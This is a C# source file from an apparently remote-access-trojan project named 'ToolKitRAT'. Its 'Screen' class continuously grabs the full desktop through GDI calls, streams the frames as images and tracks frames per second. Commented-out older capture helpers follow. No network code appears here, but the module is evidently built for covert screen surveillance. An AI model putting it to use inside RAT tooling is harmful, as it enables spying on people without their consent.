using System;
using System.Collections.Generic;
using System.Drawing;


using ToolKitRAT.WinApi;
using ToolKitRAT.WinApi.Constants;
using ToolKitRAT.WinApi.Structers;
using System.Threading;

namespace ToolKitRAT {
    public class Screen {

        private bool recording = false;
        public double FPS { get; private set; }
        public double ImageCount { get; private set; }

        public IEnumerable<Image> Record() {

            recording = true;

            IntPtr hDesk = User32.GetDesktopWindow();
            IntPtr hdcSrc = User32.GetWindowDC(hDesk);
            User32.GetWindowRect(hDesk, out RECT rect);

            int w = rect.Width;
            int h = rect.Height;

            IntPtr hdcDest = Gdi32.CreateCompatibleDC(hdcSrc);
            IntPtr hBitmap = Gdi32.CreateCompatibleBitmap(hdcSrc, w, h);
            IntPtr hOld = Gdi32.SelectObject(hdcDest, hBitmap);

            AsyncThread.Start(CalcFPS);

            while (recording) {
                Gdi32.BitBlt(hdcDest, 0, 0, w, h, hdcSrc, 0, 0, Constants.SRCCOPY);
                //Gdi32.SelectObject(hdcDest, hOld);


                yield return Image.FromHbitmap(hBitmap);

                ImageCount += 1;

                //Gdi32.DeleteObject(hBitmap);

                //hBitmap = Gdi32.CreateCompatibleBitmap(hdcSrc, w, h);
                //hOld = Gdi32.SelectObject(hdcDest, hBitmap);
            }

            Gdi32.DeleteDC(hdcDest);
            User32.ReleaseDC(hDesk, hdcSrc);
            Gdi32.DeleteObject(hBitmap);
        }
        

        private void CalcFPS() {
            while (recording) {
                Thread.Sleep(1000);
                FPS = ImageCount;
                ImageCount = 0;
            }
        }



        public void Stop() => recording = false;


        ~Screen() {
            Stop();
        }


        //Old and slow
        //public unsafe static Image CaptureWindow(IntPtr handle) {
        //    // get te hDC of the target window
        //    IntPtr hdcSrc = User32.GetWindowDC(handle);

        //    // get the size
        //    //RECT windowRect = new RECT();
        //    User32.GetWindowRect(handle, out WindowRect);
        //    RECT* wRect = &WindowRect;
        //    //int width = windowRect.Width;
        //    //int height = windowRect.Height;
        //    // create a device context we can copy to
        //    IntPtr hdcDest = Gdi32.CreateCompatibleDC(hdcSrc);
        //    // create a bitmap we can copy it to,
        //    // using GetDeviceCaps to get the width/height
        //    IntPtr hBitmap = Gdi32.CreateCompatibleBitmap(hdcSrc, wRect->Width, wRect->Height);
        //    // select the bitmap object
        //    IntPtr hOld = Gdi32.SelectObject(hdcDest, hBitmap);
        //    // bitblt over
        //    Gdi32.BitBlt(hdcDest, 0, 0, wRect->Width, wRect->Height, hdcSrc, 0, 0, Constants.SRCCOPY);

        //    // restore selection
        //    Gdi32.SelectObject(hdcDest, hOld);
        //    // clean up 
        //    Gdi32.DeleteDC(hdcDest);
        //    User32.ReleaseDC(handle, hdcSrc);
        //    // get a .NET image object for it
        //    Image img = Image.FromHbitmap(hBitmap);
        //    // free up the Bitmap object
        //    Gdi32.DeleteObject(hBitmap);
        //    return img;
        //}

        ///// <summary>
        ///// Captures a screen shot of a specific window, and saves it to a file
        ///// </summary>
        ///// <param name="handle">handel to the window task</param>
        ///// <param name="filename">the name of the file</param>
        ///// <param name="format">image format like png</param>
        //public static void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format) {
        //    Image img = CaptureWindow(handle);
        //    img.Save(filename, format);
        //}
        /// <summary>
        /// Captures a screen shot of the entire desktop, and saves it to a file
        /// </summary>
        /// <param name="filename">the name of the file</param>
        /// <param name="format">image format like png</param>
        //public static void CaptureScreenToFile(string filename, ImageFormat format) {
        //    Image img = CaptureScreen();
        //    img.Save(filename, format);
        //}
    }
}
